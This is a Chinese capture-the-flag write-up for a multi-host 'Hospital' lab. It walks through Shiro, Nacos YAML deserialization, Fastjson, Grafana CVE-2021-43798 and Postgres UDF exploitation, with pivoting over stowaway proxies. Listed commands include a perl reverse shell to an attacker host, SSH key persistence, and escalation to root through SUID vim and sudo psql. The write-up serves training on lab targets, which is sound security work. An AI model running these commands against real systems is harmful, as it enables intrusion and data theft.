---
layout: config.default_layout
title: 春秋云镜-Hospital
date: 2025-04-15 22:01:27
updated: 2025-04-15 22:03:21
comments: true
tags: [春秋云镜,Linux靶机,Windows靶机,多层代理,综合靶场,Nacos,Postgres]
categories: 靶机
---

# Hospital

> https://yunjing.ichunqiu.com/major/detail/1106?type=1
> 

在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。

39.99.226.73

## 前期踩点

```bash
⚡ root@kali  ~/Desktop/test/hospital  nmap -sT -min-rate 10000 -p- 39.99.226.73   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-10 02:33 EDT
Nmap scan report for 39.99.226.73
Host is up (0.013s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
25/tcp   open  smtp
53/tcp   open  domain
110/tcp  open  pop3
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 19.94 seconds
```

```bash
 ⚡ root@kali  ~/Desktop/test/hospital  nmap -sT -A -T4 -O -p 25,53,110,8080 39.99.226.73    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-10 02:34 EDT
Stats: 0:02:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 02:37 (0:00:42 remaining)
Nmap scan report for 39.99.226.73
Host is up (0.013s latency).

PORT     STATE SERVICE    VERSION
25/tcp   open  tcpwrapped
|_smtp-commands: Couldn't establish connection on port 25
53/tcp   open  domain?
110/tcp  open  tcpwrapped
8080/tcp open  http-proxy
| http-title: \xE5\x8C\xBB\xE7\x96\x97\xE7\xAE\xA1\xE7\x90\x86\xE5\x90\x8E\xE5\x8F\xB0
|_Requested resource was http://39.99.226.73:8080/login;jsessionid=7D5532F970DC58645801CB456EF9C439
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 302 
|     Set-Cookie: JSESSIONID=8658DE9BD5180DDE29E15CB1EA0CA3A3; Path=/; HttpOnly
|     Location: http://localhost:8080/login;jsessionid=8658DE9BD5180DDE29E15CB1EA0CA3A3
|     Content-Length: 0
|     Date: Thu, 10 Apr 2025 06:35:01 GMT
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 302 
|     Set-Cookie: JSESSIONID=6282B5CD8CC24B824D0919FC37848D74; Path=/; HttpOnly
|     Location: http://localhost:8080/login;jsessionid=6282B5CD8CC24B824D0919FC37848D74
|     Content-Length: 0
|     Date: Thu, 10 Apr 2025 06:35:01 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 302 
|     Set-Cookie: JSESSIONID=003EEA4A0C76659AEFD8C6FF6B94D73B; Path=/; HttpOnly
|     Location: http://localhost:8080/login;jsessionid=003EEA4A0C76659AEFD8C6FF6B94D73B
|     Content-Length: 0
|     Date: Thu, 10 Apr 2025 06:35:01 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 505 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Thu, 10 Apr 2025 06:35:01 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505 
|     HTTP Version Not Supported</h1></body></html>
|   Socks5: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Thu, 10 Apr 2025 06:35:01 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-trane-info: Problem with XML parsing of /evox/about

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP
Running: Actiontec embedded, Linux
OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel
OS details: Actiontec MI424WR-GEN3I WAP
Network Distance: 16 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 186.32 seconds
```

`fscan` 扫描

```bash
 ⚡ root@kali  ~/Desktop/Tools  ./fscan_1.8.4 -h 39.99.226.73 

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
39.99.226.73:8080 open
[*] alive ports len is: 1
start vulscan
[*] WebTitle http://39.99.226.73:8080  code:302 len:0      title:None 跳转url: http://39.99.226.73:8080/login;jsessionid=637A12B5B7D04CD31B9B6DB1939CC093
[*] WebTitle http://39.99.226.73:8080/login;jsessionid=637A12B5B7D04CD31B9B6DB1939CC093 code:200 len:2005   title:医疗管理后台
[+] PocScan http://39.99.226.73:8080 poc-yaml-spring-actuator-heapdump-file 
已完成 1/1
[*] 扫描结束,耗时: 20.152215581s
```

## Web 渗透

### spring-actuator-heapdump-file

发现存在 `spring-actuator-heapdump-file`

那么就将`heapdump` 文件下载下来

```bash
⚡ root@kali  ~/Desktop/test/hospital  wget http://39.99.226.73:8080/actuator/heapdump                                  
--2025-04-10 02:49:29--  http://39.99.226.73:8080/actuator/heapdump
正在连接 39.99.226.73:8080... 已连接。
已发出 HTTP 请求，正在等待回应... 200 
长度：29135811 (28M) [application/octet-stream]
正在保存至: “heapdump”

heapdump                                                 100%[==================================================================================================================================>]  27.79M  1.20MB/s  用时 20s     

2025-04-10 02:49:49 (1.41 MB/s) - 已保存 “heapdump” [29135811/29135811])
```

使用`JDumpSpider`来读取敏感信息

```bash
⚡ root@kali  ~/Desktop/test/hospital  java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump     
.....
===========================================                                                                                                                                                                                         
CookieRememberMeManager(ShiroKey)                                                                                                                                                                                                   
-------------                                                                                                     
algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES                                                                                                                                                                        
                                                                                                                  
===========================================          
.....
```

### Shiro 漏洞利用

读到了`Shiro`的`key`，想验证一下是否存在`Shiro`漏洞

![image.png](image.png)

存在，直接梭哈

![image.png](image1.png)

冰蝎连接成功

![image.png](image2.png)

## 172.30.12.5

### SUID 提权

将 `Shell` 弹到VPS上

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```

拿到`shell`第一时间写入公钥，方便后面登录

```bash
echo "ssh-rsa xxxxxx" > .ssh/authorized_keys
```

寻找是否存在 `SUID` 权限的可执行文件

```bash
find / -perm -u=s -type f 2>/dev/null
/usr/bin/vim.basic
/usr/bin/su
/usr/bin/newgrp
/usr/bin/staprun
/usr/bin/at
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/stapbpf
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

发现可以`vim`拥有SUID，因为 flag不在根目录，所以就应该在 root下

```bash
vim /root/flag/flag01.txt
```

```bash
O))     O))                              O))             O))
O))     O))                          O)  O))             O))
O))     O))   O))     O)))) O) O))     O)O) O)   O))     O))
O)))))) O)) O))  O)) O))    O)  O)) O))  O))   O))  O))  O))
O))     O))O))    O))  O))) O)   O))O))  O))  O))   O))  O))
O))     O)) O))  O))     O))O)) O)) O))  O))  O))   O))  O))
O))     O))   O))    O)) O))O))     O))   O))   O)) O)))O)))
                            O))
flag01: flag{c5271ec6-872c-4bc6-ab91-dd6651b9caad}
```

### 搭建代理

首先查看一手内网`IP` ，内网网段`172.30.12.x`

```bash
ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:05:a2:90 brd ff:ff:ff:ff:ff:ff
    inet 172.30.12.5/16 brd 172.30.255.255 scope global dynamic eth0
       valid_lft 315357620sec preferred_lft 315357620sec
    inet6 fe80::216:3eff:fe05:a290/64 scope link 
       valid_lft forever preferred_lft forever
```

使用`stowaway`来搭建代理，靶机上传`stowaway` 客户端

```bash
// VPS 
./linux_x64_admin -l 8080 -s 123123
// 靶机
./linux_x64_agent -c 8.134.163.255:8080 -s 123123 -reconnect 8 &
```

连上后，在服务端操作开`socks`代理

```bash
(admin) >> detail
Node[0] -> IP: 39.99.226.73:52592  Hostname: web01  User: app
Memo: 

(admin) >> use 0

(node 0) >> socks 2096 admin 123456
[*] Trying to listen on 0.0.0.0:2096......
[*] Waiting for agent's response......
[*] Socks start successfully!
```

进行测试，Kali上使用`proxychains4`

```bash
vim /etc/proxychains4.conf
socks5  8.134.163.255   2096    admin   123456
```

```bash
⚡ root@kali  ~/Desktop/test/hospital  proxychains curl 172.30.12.5:8080/login                                 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                            
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  8.134.163.255:2096  ...  172.30.12.5:8080  ...  OK                               
<!DOCTYPE html>                                          
<html>                                     
<head>          
    <title>医疗管理后台</title>
   ......
```

### 内网探测

上传 `fscan`进行内网网段`172.30.12.x`扫描

```bash
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.30.12.5     is alive
(icmp) Target 172.30.12.6     is alive
(icmp) Target 172.30.12.236   is alive
[*] Icmp alive hosts len is: 3
172.30.12.6:139 open
172.30.12.6:135 open
172.30.12.236:22 open
172.30.12.5:22 open
172.30.12.236:8080 open
172.30.12.5:8080 open
172.30.12.6:8848 open
172.30.12.236:8009 open
172.30.12.6:445 open
[*] alive ports len is: 9
start vulscan
[*] NetBios 172.30.12.6     WORKGROUP\SERVER02            
[*] NetInfo 
[*]172.30.12.6
   [->]Server02
   [->]172.30.12.6
[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台
[*] WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found
[*] WebTitle http://172.30.12.5:8080   code:302 len:0      title:None 跳转url: http://172.30.12.5:8080/login;jsessionid=B1295058310914FB008CE8E49BF23E4F
[*] WebTitle http://172.30.12.5:8080/login;jsessionid=B1295058310914FB008CE8E49BF23E4F code:200 len:2005   title:医疗管理后台
[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos 
[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass 
[+] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file 
```

## 172.30.12.6

### Nacos 漏洞探测

直接用工具进行检测

![image.png](image3.png)

![image.png](image4.png)

使用用户`nacos:nacos`进行登录，成功进入后台

![image.png](image5.png)

使用工具注入内存马，但是连接不成功，后面尝试了哥斯拉的也一样

![image.png](image6.png)

### Nacos Client Yaml 反序列化

那么还可以尝试 Nacos Client Yaml 反序列化漏洞

> https://h0ny.github.io/posts/Nacos-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/#nacos-client-yaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96
> 

> 工具链接：https://github.com/artsploit/yaml-payload
> 

下载之后打包成 `jar` 包

```bash
 ⚡ root@kali  ~/Desktop/test/hospital  /usr/local/jdk1.8.0_202/bin/javac yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 ⚡ root@kali  ~/Desktop/test/hospital  jar -cvf yaml-payload.jar -C yaml-payload/src/ .
adding: META-INF/ (in=0) (out=0) (stored 0%)
adding: META-INF/MANIFEST.MF (in=56) (out=56) (stored 0%)
adding: ./ (in=0) (out=0) (stored 0%)
adding: META-INF/ (in=0) (out=0) (stored 0%)
adding: META-INF/services/ (in=0) (out=0) (stored 0%)
adding: META-INF/services/javax.script.ScriptEngineFactory (in=36) (out=38) (deflated -5%)
adding: artsploit/ (in=0) (out=0) (stored 0%)
adding: artsploit/AwesomeScriptEngineFactory.class (in=1698) (out=715) (deflated 57%)
adding: artsploit/AwesomeScriptEngineFactory.java (in=1589) (out=427) (deflated 73%)
Total:
------
(in = 3363) (out = 2328) (deflated 30%)
```

Nacos的`dataid`为`db-config`

![image.png](image5.png)

因为内网机器不出网，所以我们要将`jar`包上传到靶机（172.30.12.5）上，然后在靶机上开启`HTTP`服务

```bash
python3 -m http.server 1234
```

可以看到内网服务器收到请求了，说明存在该漏洞

![image.png](image7.png)

那么我们需要修改一下`payload`文件，原本的`payload`只是弹计算器，但是对于我们没有用，我们将其改为添加一个管理员用户

![image.png](image8.png)

再打包一次

```bash
/usr/local/jdk1.8.0_202/bin/javac yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload2.jar -C yaml-payload/src/ .                                           
```

再次上传 `jar` 包，再打一次

![image.png](image9.png)

之后可以通过`RDP`进行远程桌面登录，可以通过`nxe`扫出来

![image.png](image10.png)

`administrator`家目录下能找到`flag02`

![image.png](image11.png)

```bash
flag02: flag{e2500721-804b-4e8a-978d-aa37743d9f9b}
```

### 信息收集

查看域内用户信息，但是貌似不存在域

```bash
C:\Users\sunset>net user /domain
这项请求将在域 WORKGROUP 的域控制器处理。

发生系统错误 1355。

指定的域不存在，或无法联系。
```

## 172.30.12.236

`fscan` 有扫描到 

```bash
[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台
```

访问一下

![image.png](image12.png)

尝试对其进行密码爆破，失败

![image.png](image13.png)

目录爆破，扫出来的目录像是 `tomcat` 的

```bash
⚡ root@kali  ~/Desktop/test/hospital  proxychains4 -q dirsearch -u http://172.30.12.236:8080 -x 403,404,429 -e php,zip,txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439

Output File: /root/Desktop/test/hospital/reports/http_172.30.12.236_8080/_25-04-10_04-59-22.txt

Target: http://172.30.12.236:8080/

[04:59:22] Starting: 
[04:59:30] 405 -    1KB - /;/login
[04:59:30] 400 -    0B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[04:59:31] 400 -    0B  - /a%5c.aspx
[04:59:47] 302 -    0B  - /docs  ->  /docs/
[04:59:47] 200 -   17KB - /docs/
[04:59:49] 302 -    0B  - /examples  ->  /examples/
[04:59:49] 200 -    1KB - /examples/
[04:59:49] 200 -    6KB - /examples/servlets/index.html
[04:59:49] 200 -  734B  - /examples/servlets/servlet/CookieExample
[04:59:49] 200 -  722B  - /examples/jsp/snp/snoop.jsp
[04:59:49] 200 -   14KB - /examples/jsp/index.html
[04:59:49] 200 -    1KB - /examples/servlets/servlet/RequestHeaderExample
[04:59:49] 200 -    1KB - /examples/websocket/index.xhtml
[04:59:57] 405 -    1KB - /login
[04:59:58] 302 -    0B  - /manager  ->  /manager/

Task Completed
```

访问 `docs` ，可以看到 `Tomcat`版本是`8.5.32`

![image.png](image14.png)

到这里一般都会想到后台`getshell` （打过的一台靶机：**Corrosion: 2**），但是拒绝访问了

![image.png](image15.png)

### Fastjson 漏洞检测

在登录页面测试，可以看到是传JSON的，测试一下是否存在`Fastjson`漏洞，看到报错带有`Fastjson`

![image.png](image16.png)

检测漏洞，没报错，版本应该是`1.2.47` ：https://github.com/safe6Sec/Fastjson

![image.png](image17.png)

### Fastjson 漏洞利用

使用手动`Jndi_Tool`没法成功（不知道哪里出了问题，尝试了几遍），所以这里直接使用Burp的插件`Fastjson-exp` 直接注入内存马

![image.png](image18.png)

使用哥斯拉进行连接

![image.png](image19.png)

是`root`权限

![image.png](image20.png)

写入公钥，方便后面登录

```bash
echo "ssh-rsa xxxxxx" > .ssh/authorized_keys
```

在root目录下能拿到`flag03.txt`

```bash
root@web03:~/flag# cat flag03.txt 
 /$$   /$$                               /$$   /$$               /$$
| $$  | $$                              |__/  | $$              | $$
| $$  | $$  /$$$$$$   /$$$$$$$  /$$$$$$  /$$ /$$$$$$    /$$$$$$ | $$
| $$$$$$$$ /$$__  $$ /$$_____/ /$$__  $$| $$|_  $$_/   |____  $$| $$
| $$__  $$| $$  \ $$|  $$$$$$ | $$  \ $$| $$  | $$      /$$$$$$$| $$
| $$  | $$| $$  | $$ \____  $$| $$  | $$| $$  | $$ /$$ /$$__  $$| $$
| $$  | $$|  $$$$$$/ /$$$$$$$/| $$$$$$$/| $$  |  $$$$/|  $$$$$$$| $$
|__/  |__/ \______/ |_______/ | $$____/ |__/   \___/   \_______/|__/
                              | $$                                  
                              | $$                                  
                              |__/                                  
flag03: flag{f2ba2c59-a4dc-4ea3-8036-037d1288fea6}
```

### 信息收集

双网卡主机，发现另外一个网段`172.30.54.x`

```bash
root@web03:~# ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:15:d0:ba brd ff:ff:ff:ff:ff:ff
    inet 172.30.12.236/16 brd 172.30.255.255 scope global dynamic eth0
       valid_lft 315357374sec preferred_lft 315357374sec
    inet6 fe80::216:3eff:fe15:d0ba/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:15:d0:6a brd ff:ff:ff:ff:ff:ff
    inet 172.30.54.179/24 brd 172.30.54.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe15:d06a/64 scope link 
       valid_lft forever preferred_lft forever
```

上传 `fscan` 进行扫描，新靶机开启着`5432`端口，是`PostgreSQL`

```bash
root@web03:~# ./fscan_1.8.4 -h 172.30.54.1-255

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.30.54.12    is alive
(icmp) Target 172.30.54.179   is alive
[*] Icmp alive hosts len is: 2
172.30.54.179:22 open
172.30.54.179:8009 open
172.30.54.12:22 open
172.30.54.12:3000 open
172.30.54.12:5432 open
172.30.54.179:8080 open
[*] alive ports len is: 6
start vulscan
[*] WebTitle http://172.30.54.12:3000  code:302 len:29     title:None 跳转url: http://172.30.54.12:3000/login
[*] WebTitle http://172.30.54.179:8080 code:200 len:3964   title:医院后台管理平台
[*] WebTitle http://172.30.54.12:3000/login code:200 len:27909  title:Grafana
```

### 二层代理搭建

回到 VPS（隧道服务端）设置（`node 0` 是之前第一层代理）监听 `10000` 端口（在`172.30.12.5`中监听`10000`端口）

```bash
(node 0) >> listen
[*] BE AWARE! If you choose IPTables Reuse or SOReuse,you MUST CONFIRM that the node you're controlling was started in the corresponding way!
[*] When you choose IPTables Reuse or SOReuse, the node will use the initial config(when node started) to reuse port!
[*] Please choose the mode(1.Normal passive/2.IPTables Reuse/3.SOReuse): 1
[*] Please input the [ip:]<port> : 10000
[*] Waiting for response......
[*] Node is listening on 10000
```

上传`stowaway` 客户端到 `web03` ，并连接 `172.30.12.5:10000`

```bash
root@web03:~# ./linux_x64_agent -c 172.30.12.5:10000 -s 123123 --reconnect 8
2025/04/15 20:40:12 [*] Starting agent node actively.Connecting to 172.30.12.5:10000.Reconnecting every 8 seconds
```

服务端接收到新节点

```bash
(node 0) >> 
[*] New node online! Node id is 1
```

```bash
(admin) >> detail
Node[0] -> IP: 39.99.227.193:36978  Hostname: web01  User: app
Memo: 

Node[1] -> IP: 172.30.12.236:52454  Hostname: web03  User: root
Memo:
```

设置 `socks` 节点

```bash
(admin) >> use 1
(node 1) >> socks 1081 admin admin
[*] Trying to listen on 0.0.0.0:1081......
[*] Waiting for agent's response......
[*] Socks start successfully!
```

测试，修改`Proxifier` 配置文件为新的`socks`服务，访问`172.30.54.12:3000`

![image.png](image21.png)

## 172.30.54.12

搭建着`Grafana` ，数据可视化应用程序平台

### 漏洞利用

在网上进行搜索，发现存在漏洞 **CVE-2021-43798 Grafana 未经授权的任意文件读取漏洞**

链接：https://blog.csdn.net/Jietewang/article/details/121961312

```bash
/public/plugins/alertlist/../../../../../../../../etc/passwd
```

![image.png](image22.png)

使用工具梭哈，上传到`172.30.12.236`，获得`postgres`数据库账号密码

工具链接：https://github.com/A-D-Team/grafanaExp

```bash
root@web03:~# ./linux_amd64_grafanaExp  exp -u http://172.30.54.12:3000
2025/01/24 15:01:22 Target vulnerable has plugin [alertlist]
2025/01/24 15:01:22 Got secret_key [SW2YcwTIb9zpOOhoPsMm]
2025/01/24 15:01:22 There is [0] records in db.
2025/01/24 15:01:22 type:[postgres]     name:[PostgreSQL]               url:[localhost:5432]    user:[postgres] password[Postgres@123]database:[postgres]      basic_auth_user:[]      basic_auth_password:[]
2025/01/24 15:01:22 All Done, have nice day!
```

### Postgres UDF

使用MDUT进行利用，最后可以正常进行连接，但是无法进行漏洞利用

所这里手动进行`UDF`提权

```bash
CREATE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE C STRICT;
```

然后进行反弹`shell`，使用反弹`shell`生成器来尝试，最后使用`perl`成功反弹

反弹`shell`生成器：https://www.ddosi.org/shell/

```bash
select system('perl -e \'use Socket;$i="172.30.54.179";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};\'');
```

```bash
root@web03:~# nc -lvnp 1234
Listening on 0.0.0.0 1234
id
Connection received on 172.30.54.12 42368
sh: 0: can't access tty; job control turned off
$ uid=112(postgres) gid=124(postgres) groups=124(postgres),123(ssl-cert)
```

查看权限

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```

```bash
$ sudo -l
Matching Defaults entries for postgres on web04:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User postgres may run the following commands on web04:
    (ALL) NOPASSWD: /usr/local/postgresql/bin/psql
```

在`GTFobins`查看利用

![image.png](image23.png)

登陆时提示：`psql: FATAL:  password authentication failed for user "root"`

```bash
postgres@web04:/usr/local/pgsql/data$ sudo /usr/local/postgresql/bin/psql                                         
sudo /usr/local/postgresql/bin/psql            
Password: Postgres@123root  

psql: FATAL:  password authentication failed for user "root" 
```

可能是密码不匹配，我们将其密码修改为`123456`

```bash
alter user root with password '123456';
```

再次进行利用

```bash
postgres@web04:/usr/local/pgsql/data$ sudo /usr/local/postgresql/bin/psql
sudo /usr/local/postgresql/bin/psql
Password: 123456

Welcome to psql 8.1.0, the PostgreSQL interactive terminal.

Type:  \copyright for distribution terms
       \h for help with SQL commands
       \? for help with psql commands
       \g or terminate with semicolon to execute query
       \q to quit

root-# \?
\?
General
  \c[onnect] [DBNAME|- [USER]]
                 connect to new database (currently "root")
  \cd [DIR]      change the current working directory
  \copyright     show PostgreSQL usage and distribution terms
  \encoding [ENCODING]
                 show or set client encoding
  \h [NAME]      help on syntax of SQL commands, * for all commands
  \q             quit psql
  \set [NAME [VALUE]]
                 set internal variable, or list all if no parameters
  \timing        toggle timing of commands (currently off)
  \unset NAME    unset (delete) internal variable
  \! [COMMAND]   execute command in shell or start interactive shell

Query Buffer
  \e [FILE]      edit the query buffer (or file) with external editor
  \g [FILE]      send query buffer to server (and results to file or |pipe)
  \p             show the contents of the query buffer
  \r             reset (clear) the query buffer
  \w FILE        write query buffer to file

Input/Output
--More--!/bin/sh
!/bin/sh
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

读取`flag`

```bash
# cat flag04.txt
                                           ,,                   ,,  
`7MMF'  `7MMF'                             db   mm            `7MM  
  MM      MM                                    MM              MM  
  MM      MM  ,pW"Wq.  ,pP"Ybd `7MMpdMAo.`7MM mmMMmm  ,6"Yb.    MM  
  MMmmmmmmMM 6W'   `Wb 8I   `"   MM   `Wb  MM   MM   8)   MM    MM  
  MM      MM 8M     M8 `YMMMa.   MM    M8  MM   MM    ,pm9MM    MM  
  MM      MM YA.   ,A9 L.   I8   MM   ,AP  MM   MM   8M   MM    MM  
.JMML.  .JMML.`Ybmd9'  M9mmmP'   MMbmmd' .JMML. `Mbmo`Moo9^Yo..JMML.
                                 MM                                 
                               .JMML.                               
flag04: flag{01b20010-e99a-42f1-b885-956c24a30275}
```

## 总结

打靶机不能心急，但是沙砾让我心急。

涉及到 `postgres UDF` 提权，`Nacos` 反序列化，二层代理搭建，等一系列利用。
